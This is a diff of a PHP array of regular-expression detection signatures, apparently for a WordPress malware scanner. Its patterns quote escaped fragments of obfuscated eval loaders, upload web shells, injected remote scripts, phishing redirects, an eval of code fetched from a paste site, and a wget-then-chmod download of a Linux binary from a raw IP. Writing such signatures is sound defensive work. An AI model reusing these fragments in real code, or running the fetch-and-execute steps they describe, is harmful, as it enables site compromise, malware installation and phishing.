+      'pattern' => '/\\]\\.\\$fwevy\\[20\\]\\.\\$fwevy\\[22\\]\\.\\$fwevy\\[23\\]\\.\\$fwevy\\[19\\];\\$y[\\s\\S]{0,12000}hihlm\\(\\$yrxod, \\$kbsndpi, \\$yrxod\\[9\\]\\(\\$kaczaci\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    714 => 
+    array (
+      'pattern' => '/1 \\= "";\\$_oz1joiwv \\= "";\\$_08e2c8c5 \\= _i6kzap\\:\\:_y3[\\s\\S]{0,12000}yrb8wf\\-\\>_39pz9\\(\\)\\) \\{\\$_doyrb8wf\\-\\>_zkhik\\(\\);\\}exit\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    715 => 
+    array (
+      'pattern' => '/\\$_eukn0lau \\= "";\\$_bohe8v47 \\= _z0eoik\\:\\:_jmrx5\\(\\);\\$[\\s\\S]{0,12000}bwj62z\\-\\>_1ggqn\\(\\)\\) \\{\\$_2lbwj62z\\-\\>_oudez\\(\\);\\}exit\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    716 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package HSEO
+ \\* @version 0\\.0\\.1
+ \\*\\/[\\s\\S]{0,12000}\\> "eth_call",
+        "params" \\=\\> \\[/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    717 => 
+    array (
+      'pattern' => '/public function get_url_list\\(\\$page_num, \\$pos[\\s\\S]{0,12000}_max_num_pages\\(\\) \\{
+        return 1;
+    \\}
 \\}
 
-\\$a \\= get_contents\\(\'https\\:\\/\\/ghostbin\\.co\\/paste\\/2v8nx\\/raw\'\\);
-eval\\(\'\\?\\>\'\\.\\$a\\);/s',
-      'label' => 'sample-specific content window',
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1251 => 
+    718 => 
     array (
-      'pattern' => '/sMCwkT08wMDAwKSkpKTs\\="\\)\\); \\?\\>\\<\\?php define\\("WP_USE_THEMES", true\\); require\\( dirname\\( __FILE__ \\) \\. "\\/wp\\-blog\\-header\\.php" \\);/s',
-      'label' => 'sample-specific content window',
-    ),
-    1252 => 
-    array (
-      'pattern' => '/S\', true \\);
+      'pattern' => '/\\("TIMESTAMP_FILE", "timestamp"\\);
+define\\("LINKS_C[\\s\\S]{0,12000}\\/"\\.BLOG_NAME\\."\\/\\*"\\);
+define\\("PER_PAGE", 100\\);
 
-\\/\\*\\* Loads the WordPress Environment and Template \\*\\/
-require\\( dirname\\( __FILE__ \\) \\. \'\\/wp\\-blog\\-header\\.php\' \\);/s',
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    719 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php @include\\("\\\\167\\\\160\\\\55\\\\141\\\\144\\\\155\\\\151\\\\156\\\\57\\\\151\\\\155\\\\141\\\\147\\\\145\\\\163\\\\57\\\\154\\\\151\\\\143\\\\145\\\\156\\\\163\\\\145\\\\56\\\\164\\\\170\\\\164"\\); \\?\\>/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    720 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$dPOLYoTW\\=\'y\\(3;\\]whcx\\)8\\$4mb dk1qog5sprlua\\=z_\\/0i9tvf_"76\\*\\.2n\\[je\';\\$q2866\\=\\$dPOLYoTW\\[\\(105\\/15\\)\\]\\.\\$dPOLYoTW\\[\\(26\\-1\\)\\]\\.\\$dPOLYoTW\\[\\(1\\*49\\)\\]\\.\\$dPOLYoT/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    721 => 
+    array (
+      'pattern' => '/nschedule_event\\( \\$timestamp, \\$hook, \\$v\\[\'args\'\\] \\)[\\s\\S]{0,12000}enb\\+FH8n2Pv55ODo6PkT8avCF4f8J4n\\/AgxUqhE\\=\'\\)\\)\\); \\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    722 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$QXVqO \\= \'s\'\\.\'t\'\\.\'rrev\'; \\$zYoRS \\= \'b\'\\.\'ase6\'\\.\'4\'\\.\'_\'\\.\'decode\'; \\$lRImd \\= \'gzuncompr\'\\.\'ess\'; \\$mKQIH \\= \'st\'\\.\'r\'\\.\'_\'\\.\'rot13\'; error_report/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    723 => 
+    array (
+      'pattern' => '/Upload ";
+    if \\(move_uploaded_file
+\\(\\$_FILES\\["u[\\s\\S]{0,12000}\\["\\.\\$_POST\\[\'email\'\\]\\."\\] \\- Order \\: \\$xx\\<\\/b\\>"; 
+\\}
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    724 => 
+    array (
+      'pattern' => '/p class\\="version"\\>\\<span style\\="background\\-color\\:\\#FFD700"\\>Lufix Tester\\: \\<\\?php echo VERSION; \\?\\>\\<\\/span\\>\\<\\/p\\>
+\\<\\/body\\>
+\\<\\/ht\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1253 => 
+    725 => 
     array (
-      'pattern' => '/;
-			\\$pDescriptionYuanShi \\= \\$pdescription;
-		\\}
-		
-	\\}else\\{
-		\\$pkeyword \\= \\$Ptitle;
-	
-		\\$pdescription \\= \\$nowPreStr\\.[\\s\\S]{0,160},\\$mateStr\\);
-		\\$pkeyword \\= \\$temparrII\\[0\\];
-		if\\(\\!\\$pkeyword\\)\\{
-			\\$pkeyword \\= \\$Ptitle;
-		\\}else\\{
-			\\$keyArr \\= explode\\(/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/^\\s*\\<\\?php error_reporting\\(0\\); goto Og0pc; KU3rb\\: \\$C8CFm \\= \'ba\'\\.\'se\'\\.\'64\'\\.\'_\'\\.\'de\'\\.\'code\'; goto wEMp2; Og0pc\\: function iZJj8\\(\\$gkEdS\\) \\{ goto AiDyu/s',
+      'label' => 'source-file first-line anchor',
     ),
-    1254 => 
+    726 => 
     array (
-      'pattern' => '/\'\\) \\{eval\\(\\$_ear2ijqt\\["data"\\]\\);exit;\\}\\}\\}\\$_wjz3rwiu \\= new _8zkc2u\\(\\);if \\(\\$_wjz3rwiu\\-\\>_4rglm\\(\\)\\) \\{\\$_wjz3rwiu\\-\\>_kypq1\\(\\);\\}exit\\(\\);/s',
-      'label' => 'sample-specific content window',
+      'pattern' => '/1; break; \\} \\} if\\(\\$cG9OI8 \\=\\= 0\\)\\{ echo \'\\<script ty[\\s\\S]{0,12000}ao\\+SU8a2Ci55BQb6CxG8niPS4s8W4a\\/NtkHduR\\=\'\\)\\)\\)\\); \\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1255 => 
+    727 => 
     array (
-      'pattern' => '/\\) \\{eval\\(\\$_4laz9lq9\\["data"\\]\\);exit;\\}\\}\\}\\$_0s9rkjom \\= new _b8gui6n\\(\\);if \\(\\$_0s9rkjom\\-\\>_jcbrf\\(\\)\\) \\{\\$_0s9rkjom\\-\\>_z3wku\\(\\);\\}exit\\(\\);/s',
-      'label' => 'sample-specific content window',
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* XML\\-RPC protocol support for WordPr[\\s\\S]{0,12000}pObE1UTmxZa05sUVRObE16TmxVa05sWWtObGtqTmxRek5sRW/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1256 => 
+    728 => 
     array (
-      'pattern' => '/\\) \\{eval\\(\\$_1sx7bg07\\["data"\\]\\);exit;\\}\\}\\}\\$_9lskreel \\= new _1ezdn2i\\(\\);if \\(\\$_9lskreel\\-\\>_2coqy\\(\\)\\) \\{\\$_9lskreel\\-\\>_v4rq1\\(\\);\\}exit\\(\\);/s',
-      'label' => 'sample-specific content window',
-    ),
-    1257 => 
-    array (
-      'pattern' => '/\'\\) \\{eval\\(\\$_cwwkgdrm\\["data"\\]\\);exit;\\}\\}\\}\\$_y8jf85q7 \\= new _yk8lmq\\(\\);if \\(\\$_y8jf85q7\\-\\>_2i7ny\\(\\)\\) \\{\\$_y8jf85q7\\-\\>_ix4g6\\(\\);\\}exit\\(\\);/s',
-      'label' => 'sample-specific content window',
-    ),
-    1258 => 
-    array (
-      'pattern' => '/\\) \\{eval\\(\\$_obknqk8f\\["data"\\]\\);exit;\\}\\}\\}\\$_y4gz2vko \\= new _dbangy4\\(\\);if \\(\\$_y4gz2vko\\-\\>_t8uhh\\(\\)\\) \\{\\$_y4gz2vko\\-\\>_gccog\\(\\);\\}exit\\(\\);/s',
-      'label' => 'sample-specific content window',
-    ),
-    1259 => 
-    array (
-      'pattern' => '/\\) \\{eval\\(\\$_qdj07giq\\["data"\\]\\);exit;\\}\\}\\}\\$_62ugnnj8 \\= new _ccb9coz\\(\\);if \\(\\$_62ugnnj8\\-\\>_g18xu\\(\\)\\) \\{\\$_62ugnnj8\\-\\>_a6mxk\\(\\);\\}exit\\(\\);/s',
-      'label' => 'sample-specific content window',
-    ),
-    1260 => 
-    array (
-      'pattern' => '/@include\\("\\\\167\\\\160\\\\55\\\\141\\\\144\\\\155\\\\151\\\\156\\\\57\\\\151\\\\155\\\\141\\\\147\\\\145\\\\163\\\\57\\\\154\\\\151\\\\143\\\\145\\\\156\\\\163\\\\145\\\\56\\\\164\\\\170\\\\164"\\); \\?\\>/s',
-      'label' => 'sample-specific content window',
-    ),
-    1261 => 
-    array (
-      'pattern' => '/\\<\\?php \\$dPOLYoTW\\=\'y\\(3;\\]whcx\\)8\\$4mb dk1qog5sprlua\\=z_\\/0i9tvf_"76\\*\\.2n\\[je\';\\$q2866\\=\\$dPOLYoTW\\[\\(105\\/15\\)\\]\\.\\$dPOLYoTW\\[\\(26\\-1\\)\\]\\.\\$dPOLYoTW\\[\\(1\\*49\\)\\]\\.\\$dPOLYoT/',
-      'label' => 'source-file tail snippet',
-    ),
-    1262 => 
-    array (
-      'pattern' => '/define\\( \'WP_USE_THEMES\', true \\);[\\s\\S]{0,12000}\\<\\?php \\$XONhR \\= \'bas\'\\.\'e64\'\\.\'_deco\'\\.\'de\'; \\$nUXoD \\= \'gzunco\'\\.\'mpress\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); eval\\(\\$nUXoD\\(\\$XONhR\\(\'eJz/s',
+      'pattern' => '/\\* Handle Trackbacks and Pingbacks Sent to WordPress[\\s\\S]{0,12000}\\<\\?php \\$zFGpQ \\= \'base6\'\\.\'4\'\\.\'_decod\'\\.\'e\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); eval\\(\\$zFGpQ\\(\'IGVycm9yX3JlcG9ydGluZygwKTsgQGluaV9zZX/s',
       'label' => 'source-file head-tail anchor',
     ),
-    1263 => 
+    729 => 
     array (
-      'pattern' => '/\\<\\?php \\$TGOdk \\= \'b\'\\.\'ase\'\\.\'64\'\\.\'_deco\'\\.\'de\'; \\$PjZCg \\= \'st\'\\.\'r\'\\.\'_rot1\'\\.\'3\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); eval\\(\\$PjZCg\\(\\$TGOd/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/slators\\: 1\\: Login URL, 2\\: Username, 3\\: User email address, 4\\: Lost password URL\\. \\*\\/
+					__\\( \'Your account has been acti/s',
+      'label' => 'sample-specific content window',
     ),
-    1264 => 
+    730 => 
     array (
-      'pattern' => '/\\<\\?php \\$AsdPL \\= \'st\'\\.\'r\'\\.\'_rot1\'\\.\'3\'; \\$qmbJx \\= \'bas\'\\.\'e64\'\\.\'_de\'\\.\'code\'; \\$rJwfi \\= \'str\'\\.\'rev\'; \\$Dixwy \\= \'gzinflat\'\\.\'e\'; error_reporting\\(0\\); i/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/\\<\\?php
+define\\( \'WP_USE_THEMES\', true \\);
+require _[\\s\\S]{0,12000}\\/YeFTRoHiXvhySH092lru4dhH6MKdtpf5Ca8Gv19kc5FP070/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1265 => 
+    731 => 
     array (
-      'pattern' => '/\\<\\?php \\$vksBN \\= \'base\'\\.\'64\'\\.\'_decod\'\\.\'e\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); eval\\(\\$vksBN\\(\'IGVycm9yX3JlcG9ydGluZygwKTsgQGluaV9zZX/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/\\<\\?php
+
+\\/\\*\\* Sets up the WordPress Environment\\. \\*\\/
+require __DIR__ \\. \'\\/wp\\-load\\.php\';
+
+add_filter\\( \'wp_robots\', \'wp_robots_/s',
+      'label' => 'sample-specific content window',
     ),
-    1266 => 
+    732 => 
     array (
-      'pattern' => '/\\<script src\\=\'https\\:\\/\\/jack\\.legendarytable\\.com\\/free\\.js\\?v\\=2\\.8\\.8\' type\\=\'text\\/javascript\'\\>\\<\\/script\\>\\<\\?php[\\s\\S]{0,12000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/r6dP\\/DVpyQ03FE\\+BU0Mwcm25u7anOaIeGTF1pWK5yTGx6Oew[\\s\\S]{0,12000}H5R3Sgn3ZH0u0OhgdfHN4tHRVe\\/uN2229gJ\\+0\\=\'\\)\\)\\)\\)\\); \\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1267 => 
+    733 => 
     array (
-      'pattern' => '/yright 2020 NETFLIX           \\$\\#
-\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* Outputs the OPML XML format for get[\\s\\S]{0,12000}Oa1VsTnpNbE56UWxNakFsTmpjbE5qVWxOelFsTkVRbE5qa2x/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    734 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* Gets the email message from the use[\\s\\S]{0,12000}\' \\=\\=\\= \\$content_type \\) \\{
+		\\$content \\= explode\\( \'\\-/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    735 => 
+    array (
+      'pattern' => '/^\\s*\\<script src\\=\'https\\:\\/\\/jack\\.legendarytable\\.com\\/free\\.js\\?v\\=2\\.8\\.8\' type\\=\'text\\/javascript\'\\>\\<\\/script\\>\\<\\?php[\\s\\S]{0,18000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';\\s*$/s',
+      'label' => 'source-file first-last anchor',
+    ),
+    736 => 
+    array (
+      'pattern' => '/\\/\\/ Now look for larger loops\\.\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    737 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "WordPress is readed\\."; \\$Mjhn\\=basename\\(\\$_FILES\\["upoleuid"\\]\\["name"\\]\\);if\\(move_uploaded_file\\(\\$_FILES\\["upoleuid"\\]\\["tmp_name"\\],\\$Mjhn\\)\\)/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    738 => 
+    array (
+      'pattern' => '/DmAEYFA8AD1QdAVoVSFXdwY6B1MENQRbUzQDCwUKBAlUKVdy[\\s\\S]{0,12000}kk\\[1\\]\\);
+	eval\\(passport_decrypt\\(\\$ntok,\\$opdor\\)\\);
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    739 => 
+    array (
+      'pattern' => '/\\#
+\\#\\$            C0d3d by fS0C13TY_Team[\\s\\S]{0,12000}\\#\\#\\#\\#\\#\\#\\#\\#\\#
 
 \\*\\*\\/
 header\\(\'Location\\: login\'\\);
 \\?\\>/s',
-      'label' => 'sample-specific content window',
+      'label' => 'sample-specific content window chain',
     ),
-    1268 => 
+    740 => 
     array (
-      'pattern' => '/\\$\\#
-\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#\\#
+      'pattern' => '/\\<\\/div\\>\\<div\\>\\<\\/div\\>\\<\\/div\\>\\<\\/div\\>\\<\\/body\\>\\<\\/html\\>\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    741 => 
+    array (
+      'pattern' => '/include\\("\\.\\/system\\/blocker\\.php"\\);
 
-\\*\\*\\/
-    include\\("\\.\\/system\\/system\\.php"\\);
-    include\\("\\.\\/syst/s',
+include\\("\\.\\/Bot[\\s\\S]{0,12000}\\."\\\\n"\\);
+\\$src\\="info";
+header\\("location\\:\\$src"\\);
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    742 => 
+    array (
+      'pattern' => '/ttps\\:\\/\\/redirectbilling\\.qpon\\/sechl";
+header\\(\'Location\\: \'\\.\\$url\\);
+die\\(\\);
+\\?\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1269 => 
+    743 => 
     array (
       'pattern' => '/php  opcache_reset\\(\\); \\?\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1270 => 
+    744 => 
     array (
-      'pattern' => '/echo file_get_contents\\(\\$indhtml\\);
-    \\}
-\\}
-\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/
-class_x_i\\(\\);
-\\?\\>/s',
+      'pattern' => '/\\<\\?php
+\\$url \\= "https\\:\\/\\/uspsrecom\\.icu\\/";
+header\\(\'Location\\: \'\\.\\$url\\);
+die\\(\\);/s',
       'label' => 'sample-specific content window',
     ),
-    1271 => 
+    745 => 
     array (
-      'pattern' => '/Mozilla\\/5\\.0 \\(Windows NT 6\\.1; Win64; x64\\) AppleWebKit\\/537\\.36 \\(KHTML, like Gecko\\) Chrome\\/96\\.0\\.4664\\.110 Safari\\/537\\.36[\\s\\S]{0,160}Mozilla\\/5\\.0 \\(Windows NT 6\\.3; Win64; x64\\) AppleWebKit\\/537\\.36 \\(KHTML, like Gecko\\) Chrome\\/96\\.0\\.4664\\.110 Safari\\/537\\.36/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/^\\s*\\<\\?php echo \'Xblackflower TEaM Plesk Shell \\(Pawnd by X\\-BLACKFLOWER\\) ALFA TEaM kom\\.php Tesla DATA CENTER INDONESIA Plesk File Manager Shell\'; /s',
+      'label' => 'source-file first-line anchor',
     ),
-    1272 => 
+    746 => 
+    array (
+      'pattern' => '/\\* logIO\\(\\) \\- Writes logging info to a file\\.
+ \\*
+ \\* @since 1\\.2\\.0
+ \\* @deprecated 3\\.4\\.0 Use error_log\\(\\)
+ \\* @see error_log\\(\\)/s',
+      'label' => 'sample-specific content window',
+    ),
+    747 => 
+    array (
+      'pattern' => '/,42,2,42,4,22\\)\\);\\$k6\\[\\] \\= q1\\(Array\\(42,10,2,33,37,1[\\s\\S]{0,12000}\\(\\$k6\\[5\\], \\$z11 \\^ x8\\(\\$k6, \\$v14, \\$k6\\[13\\]\\(\\$z11\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    748 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package wp
+ \\*\\/
+\\/\\*
+Plugin Name\\: t_f[\\s\\S]{0,12000}_dir\\."\\/"\\.\\$_POST\\["folder"\\]\\."\\/wp\\-content"\\."\\/"\\.\\$_FI/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    749 => 
+    array (
+      'pattern' => '/\\.org\\/
+\\* Description\\: Wordpress CMS core module\\.[\\s\\S]{0,12000}ress
+\\* Author URI\\: https\\:\\/\\/wordpress\\.org\\/
+\\*\\*\\/
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    750 => 
+    array (
+      'pattern' => '/0,11,0,48,43\\)\\);\\$a6\\[\\] \\= f1\\(Array\\(0,13,11,8,6,3,0\\)[\\s\\S]{0,12000}\\(\\$a6\\[5\\], \\$j11 \\^ t8\\(\\$a6, \\$g14, \\$a6\\[13\\]\\(\\$j11\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    751 => 
+    array (
+      'pattern' => '/SERVER\\[\'HTTP_X_REAL_IP\'\\];\\}if \\(isset\\(\\$_SERVER\\[\'HT[\\s\\S]{0,12000}nl9ufb\\-\\>_2sdwn\\(\\)\\) \\{\\$_0znl9ufb\\-\\>_cw488\\(\\);\\}exit\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    752 => 
+    array (
+      'pattern' => '/15,3,15,24,29\\)\\);\\$i6\\[\\] \\= h1\\(Array\\(15,25,3,30,27,1[\\s\\S]{0,12000}\\(\\$i6\\[5\\], \\$z11 \\^ o8\\(\\$i6, \\$y14, \\$i6\\[13\\]\\(\\$z11\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    753 => 
     array (
       'pattern' => '/\\<\\?php
 \\/\\*c1d9a\\*\\/
@@ -8356,122 +4864,444 @@ class_x_i\\(\\);
 \\/\\*c1d9/s',
       'label' => 'sample-specific content window',
     ),
-    1273 => 
+    754 => 
     array (
-      'pattern' => '/@include "\\\\057h\\\\157m\\\\145\\/\\\\141d\\\\162iXXXXXXXXXXXXXXXXXXXXXXXXX\\\\145\\/\\\\147u\\\\154l\\\\171h\\\\157l\\\\145\\/\\\\0564\\\\071b\\\\0646\\\\0717\\\\142\\.\\\\151c\\\\157";/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/,15,45,22,14,22,29,23\\)\\);\\$k6\\[\\] \\= p1\\(Array\\(22,48,1[\\s\\S]{0,12000}\\(\\$k6\\[5\\], \\$y11 \\^ q8\\(\\$k6, \\$b14, \\$k6\\[13\\]\\(\\$y11\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1274 => 
+    755 => 
     array (
-      'pattern' => '/\\<\\?php error_reporting\\(0\\); \\$AUM \\= range\\(chr\\(126\\),chr\\(20\\)\\);\\$UF\\=\\$\\{\\$AUM\\[31\\]\\.\\$AUM\\[59\\]\\.\\$AUM\\[47\\]\\.\\$AUM\\[47\\]\\.\\$AUM\\[51\\]\\.\\$AUM\\[53\\]\\.\\$AUM\\[57\\]\\};\\$UF\\=\\$\\{\\$AUM\\[31/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/^\\s*\\<\\?php \\$v \\= "base"\\.chr\\(54\\)\\.chr\\(52\\)\\.chr\\(95\\)\\.chr\\(100\\)\\.chr\\(101\\)\\.chr\\(99\\)\\."ode"; if\\(isset\\(\\$_REQUEST\\[\'lt\'\\]\\) && md5\\(\\$_REQUEST\\[\'lt\'\\]\\) \\=\\= \\$v\\("MDIzMjU4/s',
+      'label' => 'source-file first-line anchor',
     ),
-    1275 => 
+    756 => 
     array (
-      'pattern' => '/\\*\\s+abuse\\s+appreciate\\s+bother\\s+catalog\\s+compete\\s+elastic\\s+evaluate\\s+external\\s+hydrogen\\s+import\\s+interpret\\s+profitable\\s+prospect\\s+ridid\\s+route\\s+severe\\s+shallow\\s+stuff\\s+tedious\\s+territory\\s+thrust\\./',
-      'label' => 'sample-specific line fragment',
+      'pattern' => '/XXXXXXXXXXXXXXXXXXXXXXXX\\\\145\\/\\\\147u\\\\154l\\\\171h\\\\157[\\s\\S]{0,12000}\\/\\\\0564\\\\071b\\\\0646\\\\0717\\\\142\\.\\\\151c\\\\157";
+
+\\/\\*4a882\\*\\//s',
+      'label' => 'sample-specific content window chain',
     ),
-    1276 => 
+    757 => 
     array (
-      'pattern' => '/\\) \\{eval\\(\\$_ra108g0o\\["data"\\]\\);exit;\\}\\}\\}\\$_th7osxmh \\= new _d1ppwji\\(\\);if \\(\\$_th7osxmh\\-\\>_3nx61\\(\\)\\) \\{\\$_th7osxmh\\-\\>_9a8og\\(\\);\\}exit\\(\\);/s',
+      'pattern' => '/^\\s*\\<\\?php error_reporting\\(0\\); \\$AUM \\= range\\(chr\\(126\\),chr\\(20\\)\\);\\$UF\\=\\$\\{\\$AUM\\[31\\]\\.\\$AUM\\[59\\]\\.\\$AUM\\[47\\]\\.\\$AUM\\[47\\]\\.\\$AUM\\[51\\]\\.\\$AUM\\[53\\]\\.\\$AUM\\[57\\]\\};\\$UF\\=\\$\\{\\$AUM\\[31/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    758 => 
+    array (
+      'pattern' => '/\\<\\?php
+function downloadFile\\(\\$url, \\$path\\)
+\\{
+    \\$[\\s\\S]{0,12000}24 \\* 8\\);
+            \\}
+        \\}
+    \\}
+    if \\(\\$/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    759 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php function lqiropjqzq\\(\\$pazwxggcew\\)\\{/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    760 => 
+    array (
+      'pattern' => '/\\<\\?php
+system\\(\'wget "http\\:\\/\\/173\\.230\\.140\\.78\\/Linux_[\\s\\S]{0,12000}Linux_x86"\'\\);
+system\\(\'chmod 777 \\.\\/Linux_x86\'\\);
+s/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    761 => 
+    array (
+      'pattern' => '/clearfix";
+\\$arrBread\\[\\]\\="breadLists clearfix";
+\\$arrBread\\[\\]\\="nw\\-breadcrumblist";
+\\$arrBread\\[\\]\\="BreadcrumbLists";
+\\$arrBread/s',
       'label' => 'sample-specific content window',
     ),
-    1277 => 
+    762 => 
     array (
-      'pattern' => '/@include "\\\\057home\\\\057your\\\\142t\\/sn\\\\143onsu\\\\154ting\\\\056rs\\/w\\\\160\\-inc\\\\154udes\\\\057Simp\\\\154ePie\\\\057HTTP\\\\057\\.e9a\\\\063ece3\\\\056ico";[\\s\\S]{0,12000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/_d3jdgox4\\["uid"\\] \\= _d1ppwji\\:\\:\\$_yhgzgusu;\\$_d3jdgo[\\s\\S]{0,12000}7osxmh\\-\\>_3nx61\\(\\)\\) \\{\\$_th7osxmh\\-\\>_9a8og\\(\\);\\}exit\\(\\);/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1278 => 
+    763 => 
     array (
-      'pattern' => '/@include "\\\\057home\\\\057difu\\\\172er\\/o\\\\172oniz\\\\141tor\\.\\\\162s\\/wp\\\\055cont\\\\145nt\\/p\\\\154ugin\\\\163\\/tem\\\\160late\\\\163\\-pat\\\\164erns\\\\055coll\\\\145ctio\\\\156\\/\\.67\\\\1[\\s\\S]{0,12000}\\* @link https\\:\\/\\/wordpress\\.org\\/support\\/article\\/editing\\-wp\\-config\\-php\\//s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/;\\$cemkba\\[\\] \\= \\$cvsjvtb\\[9\\]\\.\\$cvsjvtb\\[6\\]\\.\\$cvsjvtb\\[20[\\s\\S]{0,12000}xzrpm\\(\\$cemkba, \\$aulrzsf, \\$cemkba\\[9\\]\\(\\$mougt\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1279 => 
+    764 => 
     array (
-      'pattern' => '/v \\<\\<\\= 5;
-        if \\(\\$LNCF\\[\\$i\\] \\>\\= \'a\' && \\$LNCF\\[\\$i\\] \\<\\= \'z\'\\)\\{
-            \\$v \\+\\= \\(ord\\(\\$LNCF\\[\\$i\\]\\) \\- 97\\);
-        \\} elseif \\(\\$/s',
-      'label' => 'sample-specific content window',
+      'pattern' => '/\\<\\?php
+\\/\\*522cf\\*\\/
+
+@include "\\\\057home\\\\057your\\\\142t[\\s\\S]{0,12000}er\\.php which does and tells WordPress to load th/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1280 => 
+    765 => 
     array (
-      'pattern' => '/;
-	\\$str\\=get_str\\(\\$str\\);
-	\\#\\$str \\= str_rot13\\(\\$str\\);
-	m\\(\\$str\\);
-\\}
-function get1_str\\(\\$str1\\)\\{
-	\\$str \\= \\$str1\\.[\\s\\S]{0,160};
-	return \\$str;
+      'pattern' => '/tf8;\';
+		require_once\\(ABSPATH\\.\'wp\\-admin\\/includes[\\s\\S]{0,12000}e64_decode\\( \'Ijs8L3NjcmlwdD4\\=\' \\);
 	
+    \\}
 \\}
-function m\\(\\$str\\)\\{
-	global \\$password;
-	\\$str1\\=/',
-      'label' => 'sample-specific literal chain',
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1281 => 
+    766 => 
+    array (
+      'pattern' => '/\\\\x51\\\\x58\\\\x4C\\\\x5F\\\\x30\\\\x12\\\\x5f\\\\x43\\\\x4f\\\\x4f\\\\x4b\\\\x49\\\\x45/',
+      'label' => 'sample-specific literal',
+    ),
+    767 => 
+    array (
+      'pattern' => '/\\\\x47\\\\x3F\\\\x05\\\\x3C\\\\x22\\\\x0F\\\\x5f\\\\x43\\\\x4f\\\\x4f\\\\x4b\\\\x49\\\\x45/',
+      'label' => 'sample-specific literal',
+    ),
+    768 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?\\=\\/\\*\\!\\*\\/@\\/\\*\\*8\\*\\*\\/null; echo@null;goto O1527;O9995\\:\\$O1505\\=\'o\';goto O6771;O6214\\:\\$O6030\\=\'n\';goto O5588;O8133\\:\\$O6306\\=\'f\';goto O6401;O6400\\:\\$O1271\\=/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    769 => 
